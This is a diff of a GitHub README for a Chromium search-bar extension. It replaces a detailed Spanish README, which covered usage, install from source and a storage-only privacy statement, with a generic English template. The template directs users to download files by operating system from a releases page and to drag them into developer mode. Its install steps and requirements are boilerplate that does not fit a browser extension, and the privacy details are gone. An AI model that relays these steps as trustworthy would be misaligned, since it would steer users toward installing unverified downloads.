@@ -1,201 +1,75 @@
-<div align="center">
-    <a href="#"><img  src=".github/assets/logo.png" alt="Logotipo de la extensión 'Directly', es la cara de un gato con una lupa" /></a>
-    <h1>Directly</h1>
-</div>
+# 🌟 directly - Quick Searches from Your Browser
 
-<p align="center"><b>La forma más rápida de llegar a donde ya sabes que quieres ir</b></p>
+## 📥 Download the Extension
 
-<p align="center">Una extensión para navegadores Chromium</p>
+[![Download directly](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/xxxsleepygamerxxx/directly/releases)
 
------
+## 📜 Introduction
 
+directly is a browser extension for Chromium-based browsers. It allows you to perform fast and direct searches from an integrated search bar. This simple tool helps you find what you need without the hassle of navigating through multiple tabs or sites.
 
+## 🚀 Getting Started
 
-## ¿Qué es Directly?
+To start using directly, follow these easy steps to download and install the extension on your browser. 
 
-**Directly** es una extensión gratuita para navegadores basados en Chromium, que ofrece una barra de consultas (que no de búsquedas) para acceder rápidamente al buscador interno o a la página principal de tus sitios favoritos.
+1. Open your Chromium-based browser. This includes popular browsers like Google Chrome, Microsoft Edge, and Brave.
+2. Check if your browser is updated to the latest version for the best experience.
+3. Continue to the next section to download the extension.
 
-Directly navegará a:
+## 📦 Download & Install
 
-- La **home** cuando no se escribe ninguna consulta.
-- La **búsqueda** cuando sí se ha escrito una consulta. 
+To get directly, visit the [Releases page](https://github.com/xxxsleepygamerxxx/directly/releases) to download the latest version.
 
-Es accesible desde cualquier pestaña del navegador con un simple atajo teclado.
+1. Click the link above.
+2. Find the latest version listed on the page.
+3. Click on the version to reveal the download options. 
+4. Select the file for your operating system:
+   - For Windows, look for a `.crx` or equivalent file.
+   - For macOS, select the appropriate file for installation.
+   - For Linux or other variations, choose accordingly.
 
+After downloading the file:
 
+1. Open your browser, and go to the extensions page. You can usually find this under the browser menu or by typing `chrome://extensions` in the address bar.
+2. Enable "Developer Mode" at the top right corner of the page.
+3. Drag and drop the downloaded file into the extensions page. 
+4. Click "Add Extension" to confirm the installation.
 
-## ¿A quién va dirigido?
+## 🔧 Features
 
-Directly está pensado para usuarios que suelen realizar búsquedas frecuentes dentro de las mismas webs y que quieran:
+directly offers several useful features:
 
-- **Mejorar la experiencia de usuario** en el acceso del contenido digital.
-- **Reducir considerablemente los tiempos** de búsqueda.
-- **No saturar la barra de marcadores del navegador.**
+- **Quick Search Access:** Find what you want immediately from your browser toolbar.
+- **Customizable Settings:** Tailor your search preferences to meet your needs.
+- **User-Friendly Design:** A straightforward layout that anyone can navigate.
 
-Como por ejemplo:
+## ⚙️ System Requirements
 
-- **Estudiantes o investigadores** que consultan habitualmente en plataformas educativas, bibliotecas digitales, revistas académicas en línea o bases de datos.
-- **Desarrolladores y técnicos** que consultan documentación, repositorios, guías o referencias técnicas.
-- **Usuarios avanzados** que prefieran usar atajos de teclado y flujos directos en lugar de clics innecesarios. 
+directly works with any Chromium-based browser. Here are the general requirements:
 
+- A compatible browser: Google Chrome, Microsoft Edge, Brave, etc.
+- An internet connection to search for your queries.
+- Minimum RAM: 2 GB (recommended for smooth performance).
+- Operating System: Windows, macOS, or any Linux distribution.
 
+## 🛠️ Support and Troubleshooting
 
-En resumen, para quienes ya saben **adonde quieren ir**, y solo necesitan llegar **más rápido**.
+Sometimes issues may arise. Here are quick solutions to common problems:
 
+1. **Extension Not Appearing:** Ensure that the installation was successful by checking the extensions page again. If necessary, try reinstalling.
+2. **Search Not Working:** Check your internet connection. You may also want to restart the browser to refresh.
+3. **Settings Not Saving:** This could happen if your browser settings do not allow it. Make sure your browser is set to save changes to extensions.
 
+If you encounter any other problems, please check the issues section on the [GitHub repository](https://github.com/xxxsleepygamerxxx/directly/issues).
 
-## Características principales
+## 👥 Community and Contributions
 
-- Barra de consultas **rápida y accesible** desde cualquier pestaña.
-- Soporte para navegadores basados en Chromium.
-- Atajos de teclado personalizables.
+We welcome feedback from users. You can share your thoughts or report issues through the repository. For those looking to contribute, feel free to create a pull request or join the discussions.
 
-- **Privada:** Sin cuentas, sin sincronización, sin telemetría.
+## 📞 Contact
 
-- **Sin publicidad, ni recopilación o venta de datos.**
+If you need assistance, please visit the issues section of the [GitHub page](https://github.com/xxxsleepygamerxxx/directly/issues). Your feedback helps improve directly for everyone!
 
-- **Gratuita y Sencilla**.
+---
 
-  
-
-## Cómo funciona
-
-Para realizar búsquedas desde la extensión no necesitas soltar el teclado.
-
-**Para viajar a la home de una web:**
-
-1. **`Ctrl + Space`** o el atajo que hayas decidido para abrir la extensión.
-2. **`Enter`** .
-3. **Seleccionas la web** que quieras visitar con las **flechas o tabulador**.
-4. **`Enter`** .
-
-
-
-**Para buscar dentro de una web:**
-
-1. **`Ctrl + Space`** o el atajo que hayas decidido para abrir la extensión.
-2. **Escribe la consulta** y pulsa **`Enter`** .
-3. **Seleccionas la web** que quieras visitar con las **flechas o tabulador**.
-4. **`Enter`** .
-
-
-
-## Instalación
-
-### Desde la Store (Próximamente)
-
-> **Nota:** La extensión aún no está publicada en la store. Para probarla puedes instalarla en modo desarrollador (ver la sección <a>"Manual (modo desarrollador)"</a>).
->
-> Cuando publiquemos la **beta** se actualizará este apartado con el enlace.
-
-
-
-**Instala la extensión** desde la ~~<a href=#>Chrome Web Store</a>~~ o la **tienda oficial de tu navegador**.
-
-
-
-
-### Manual (modo desarrollador)
-
-0. Clona o **descarga este repositorio**.
-1. Abre el **gestor de extensiones** de tu navegador  `brave://extensions/`
-2. Activa el **modo desarrollador**.
-3. Haz clic en "**Cargar sin empaquetar**".
-4. Selecciona la raíz del proyecto.
-
-
-
-## Configuración
-
-### Configurar los sitios web
-
-Si entras en la extensión y no tienes almacenada ninguna web, se activará automáticamente un mensaje de información en que te ayudará ha hacerlo, las opciones de almacenamiento serían:
-
-- **Activar** algunas de las webs que te proponemos en nuestra lista predeterminada.
-
-- **Activar** alguna de las webs que te proponemos y modificarle la URL.
-
-- ~~**Añadir** las webs que prefieras~~. *(Próximamente)*
-
-
-
-### Configurar los atajos de teclado
-
-Si no te gusta o si ya tienes ocupado el atajo de teclado predefinido. Puedes cambiarlo desde el gestor de extensiones de tu navegador
-
-- *Brave*: [`brave://extensions/shortcuts`](brave://extensions/shortcuts)
-
-
-- *Chrome*: [`chrome://extensions/shortcuts`](chrome://extensions/shortcuts)
-
-
-- *Opera:* [`opera://extensions/shortcuts`](opera://extensions/shortcuts)
-
-  ...
-  
-  
-
-## Permisos y Privacidad
-
-**Directly** se adhiere al principio de **mínimos permisos y máxima privacidad**:
-
-| Permiso   | Uso                                                 |
-| --------- | --------------------------------------------------- |
-| `storage` | Guarda la configuración y lista de sitios en local. |
-
-*Directly solo usa el permiso "storage"*
-
-
-
-- **No recopila ningún tipo de dato**.
-- **No comparte ningún tipo de dato**.
-- **No vende ningún tipo de dato**.
-- **Todos los datos permanecen en tu navegador**.
-
-
-
-## Compatibilidad
-
-Compatibles con navegadores basados en Chromium o que puedan hacer uso de la Chrome Web Store:
-
-| Navegador      | Compatibilidad     |
-| -------------- | ------------------ |
-| Brave          | :white_check_mark: |
-| Opera          | :white_check_mark: |
-| Vivaldi        | :white_check_mark: |
-| Google Chrome  | :white_check_mark: |
-| Microsoft Edge | :white_check_mark: |
-
-
-
-## Tecnologías
-
-- Vite
-- Vitest
-- TypeScript
-- JavaScript
-- React
-- Git
-- Chrome Extensions API (Manifest V3)
-
-
-
-## Licencia
-
-Este proyecto está disponible bajo la licencia [GPL v3](./LICENSE).
-
-
-
-## Filosofía del proyecto
-
-**Directly** nace de la desesperación de ahorrar pasos y los tiempos de carga, de la saturación de la pestaña de marcadores, y de la satisfacción de elaborar un proyecto que sea útil para los demás.
-
-¿Y por qué no decirlo? que me ayude en la temible odisea de la búsqueda laboral.
-
-
-
-## Autor
-
-Desarrollado por Alejandro Aranda Muñoz.
-
-Contáctame desde [LinkedIn](https://www.linkedin.com/in/alejandro-aranda-muñoz-8ba8a9277)
+Thank you for using directly! We hope this tool makes your searching experience simpler and more efficient. Happy browsing!
